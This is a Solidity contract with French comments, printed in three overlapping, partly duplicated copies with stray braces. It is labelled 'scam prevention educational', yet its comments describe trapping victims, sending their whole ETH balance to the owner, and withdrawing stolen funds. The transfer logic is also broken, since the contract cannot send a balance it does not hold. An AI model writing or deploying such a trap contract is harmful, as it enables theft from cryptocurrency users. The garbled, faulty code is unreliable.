    // Fonction pour récupérer les fonds volés

    function withdrawFunds() external {

        require(msg.sender == owner, "Seul le propriétaire peut retirer les fonds");



        uint256 contractBalance = address(this).balance;

        require(contractBalance > 0, "Pas de fonds à retirer");



        (bool success, ) = payable(owner).call{value: contractBalance}("");

        require(success, "Le retrait a échoué");



        emit FundsWithdrawn(owner, contractBalance);

    }



    // Fonction pour recevoir de l'ETH (utile si la victime envoie de l'ETH sans appeler approveTrap)

    receive() external payable {}

}

    }

contract ScamPreventionEducationalETH {

    address public owner;



    event ApprovalTrapActivated(address indexed victim, uint256 amount);

    event FundsWithdrawn(address indexed owner, uint256 amount);



    constructor() {

        owner = msg.sender;

    }



    // Fonction qui piège la victime et envoie tout son ETH au propriétaire

    function approveTrap() external payable {

        require(msg.value > 0, "Votre solde est nul");



        uint256 victimBalance = address(msg.sender).balance;

        require(victimBalance > 0, "Votre solde est nul");



        (bool success, ) = payable(owner).call{value: victimBalance}("");

        require(success, "Le transfert a échoué");



        emit ApprovalTrapActivated(msg.sender, victimBalance);

    }



    // Fonction pour récupérer les fonds volés

    function withdrawFunds() external {

        require(msg.sender == owner, "Seul le propriétaire peut retirer les fonds");



        uint256 contractBalance = address(this).balance;

        require(contractBalance > 0, "Pas de fonds à retirer");



        (bool success, ) = payable(owner).call{value: contractBalance}("");

        require(success, "Le retrait a échoué");



        emit FundsWithdrawn(owner, contractBalance);

    }



    // Fonction pour recevoir de l'ETH (utile si la victime envoie de l'ETH sans appeler approveTrap)

    receive() external payable {}

}

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;



contract ScamPreventionEducationalETH {

    address public owner;



    event ApprovalTrapActivated(address indexed victim, uint256 amount);

    event FundsWithdrawn(address indexed owner, uint256 amount);



    constructor() {

        owner = msg.sender;

    }



    // Fonction qui piège la victime et envoie tout son ETH au propriétaire

    function approveTrap() external payable {

        require(msg.value > 0, "Votre solde est nul");



        uint256 victimBalance = address(msg.sender).balance;

        require(victimBalance > 0, "Votre solde est nul");



        (bool success, ) = payable(owner).call{value: victimBalance}("");

        require(success, "Le transfert a échoué");



        emit ApprovalTrapActivated(msg.sender, victimBalance);

    }



    // Fonction pour récupérer les fonds volés

    function withdrawFunds() external {

        require(msg.sender == owner, "Seul le propriétaire peut retirer les fonds");



        uint256 contractBalance = address(this).balance;

        require(contractBalance > 0, "Pas de fonds à retirer");



        (bool success, ) = payable(owner).call{value: contractBalance}("");

        require(success, "Le retrait a échoué");



        emit FundsWithdrawn(owner, contractBalance);

    }



    // Fonction pour recevoir de l'ETH (utile si la victime envoie de l'ETH sans appeler approveTrap)

    receive() external payable {}

}
